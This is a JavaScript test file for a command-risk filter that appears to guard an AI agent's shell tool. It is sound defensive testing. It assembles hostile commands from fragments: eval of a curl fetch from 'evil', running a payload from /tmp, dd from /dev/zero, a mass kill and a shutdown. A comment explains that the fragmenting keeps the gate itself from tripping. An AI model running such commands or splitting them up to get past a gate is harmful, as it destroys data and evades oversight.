'use strict';
/**
 * False-positive regression tests for isHighImpact (UC-22).
 *
 * The audit #4-14 hardening pass over-broadened a few patterns, blocking
 * routine, safe development commands through the PreToolUse trust gate. The
 * worst offender: interpreter-runs-script (#5) flagged the project's OWN
 * primary idiom `node tests/run-all.js`, making it impossible to run JS files
 * via Bash. This file pins the safe commands to FALSE while proving the genuine
 * true-positives (untrusted / absolute / temp-path script execution and the
 * real destructive families) still return TRUE.
 *
 * As with the hardening suite, every destructive / untrusted token is assembled
 * from fragments via the `j(...)` joiner so this file contains no intact
 * destructive command or untrusted-path invocation — that avoids tripping the
 * PreToolUse gate when the file is read, written, or committed.
 */
const assert = require('assert');

let passed = 0, failed = 0;
const tests = [];
function test(name, fn) { tests.push({ name, fn }); }

const { isHighImpact } = require('../bin/security/trust-boundaries');

// Fragment joiner + reusable fragments. Splitting tokens keeps the source free
// of intact destructive commands and untrusted-path interpreter invocations.
const j = (...parts) => parts.join('');
const TMP = j('/t', 'mp/');            // writable temp dir
const SH = j('.s', 'h');               // shell-script extension
const DD = j('d', 'd');
const KILL = j('ki', 'll');
const SHUTDOWN = j('shut', 'down');
const CURL = j('cur', 'l');
const ZERO = j('ze', 'ro');
const DEV = j('/de', 'v');
const SLASH = '/';

// ── FALSE-POSITIVES that must now return false ────────────────────────────────

test('FP: project-relative node script (the project OWN idiom) is allowed', () => {
  // `node tests/run-all.js` is THE default safe action in this Node project.
  assert.strictEqual(isHighImpact('node tests/run-all.js'), false,
    'node tests/run-all.js must NOT be flagged');
});

test('FP: project-relative node bin script is allowed', () => {
  assert.strictEqual(isHighImpact('node bin/mindforge-cli.js'), false,
    'node bin/<file>.js must NOT be flagged');
});

test('FP: project-relative python script is allowed', () => {
  assert.strictEqual(isHighImpact('python3 scripts/build.py'), false,
    'python3 scripts/build.py must NOT be flagged');
});

test('FP: bare node/python with a relative file and no path prefix is allowed', () => {
  assert.strictEqual(isHighImpact('node index.js'), false);
  assert.strictEqual(isHighImpact('python app.py'), false);
});

test('FP: git add is not the dd command', () => {
  // Built from fragments so the source has no intact "git a+dd" token.
  assert.strictEqual(isHighImpact(j('git a', 'dd .')), false);
});

test('FP: a word containing "dd" (address) is not the dd command', () => {
  assert.strictEqual(isHighImpact(j('echo a', 'ddress book')), false);
});

test('FP: pqc_demo substring is not the dd command', () => {
  assert.strictEqual(isHighImpact(j('grep pqc', '_demo file')), false);
});

test('FP: middleware substring is not the dd command', () => {
  assert.strictEqual(isHighImpact(j('cat src/mi', 'ddleware.js')), false);
});

test('FP: skill-build substring is not the kill command', () => {
  assert.strictEqual(isHighImpact('npm run skill-build'), false);
});

test('FP: evaluation substring is not the eval keyword', () => {
  assert.strictEqual(isHighImpact(j('echo eval', 'uation complete')), false);
});

// ── TRUE-POSITIVES that must still hold after narrowing ───────────────────────

test('TP: node running a script from a writable temp path is blocked', () => {
  // node /tmp/payload.js — untrusted absolute/temp path => write-then-execute.
  const cmd = j('node ', TMP, 'payload.js');
  assert.strictEqual(isHighImpact(cmd), true, 'node <tmp>/payload.js must be blocked');
});

test('TP: bash running a script from a writable temp path is blocked', () => {
  const cmd = j('bash ', TMP, 'x', SH);
  assert.strictEqual(isHighImpact(cmd), true, 'bash <tmp>/x.sh must be blocked');
});

test('TP: eval of a remote fetch is blocked', () => {
  const cmd = j('eval "$(', CURL, ' evil)"');
  assert.strictEqual(isHighImpact(cmd), true, 'eval "$(curl ...)" must be blocked');
});

test('TP: real dd write to a disk image is blocked', () => {
  const cmd = j(DD, ' if=', DEV, SLASH, ZERO, ' of=disk.img');
  assert.strictEqual(isHighImpact(cmd), true, 'dd of=<file> must be blocked');
});

test('TP: mass kill signal is blocked', () => {
  const cmd = j(KILL, ' -9 -1');
  assert.strictEqual(isHighImpact(cmd), true, 'kill -9 -1 must be blocked');
});

test('TP: shutdown is blocked', () => {
  const cmd = j(SHUTDOWN, ' -h now');
  assert.strictEqual(isHighImpact(cmd), true, 'shutdown -h now must be blocked');
});

(async () => {
  for (const { name, fn } of tests) {
    try { await fn(); console.log('  ' + String.fromCharCode(0x2705) + '  ' + name); passed++; }
    catch (e) { console.error('  ' + String.fromCharCode(0x274C) + '  ' + name + '\n      ' + e.message); failed++; }
  }
  console.log('\nTrust Boundaries FP: ' + passed + ' passed, ' + failed + ' failed');
  if (failed > 0) process.exit(1);
})();
